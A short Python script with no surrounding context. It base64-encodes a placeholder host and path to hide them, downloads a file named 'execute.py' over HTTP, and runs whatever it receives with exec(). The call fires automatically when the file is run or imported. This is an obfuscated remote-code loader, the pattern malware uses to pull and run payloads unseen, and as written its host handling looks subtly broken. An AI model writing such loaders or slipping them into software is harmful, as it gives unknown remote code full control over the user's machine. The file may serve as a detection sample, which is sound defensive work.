import http.client
import base64
import types

def make_request(host, path):
    conn = http.client.HTTPConnection(host)
    conn.request("GET", path)
    res = conn.getresponse()
    code = res.read().decode('utf-8')
    conn.close()
    return code

def cryptic_function():
    encoded_host = "aHR0cDovL21vY2stcHl0aG9uLw=="
    encoded_path = "ZXhlY3V0ZS5weQ=="
    decoded_host = base64.b64decode(encoded_host).decode('utf-8')
    decoded_path = base64.b64decode(encoded_path).decode('utf-8')
    code = make_request(decoded_host, decoded_path)
    module = types.ModuleType("loaded_module")
    exec(code, module.__dict__)

cryptic_function()
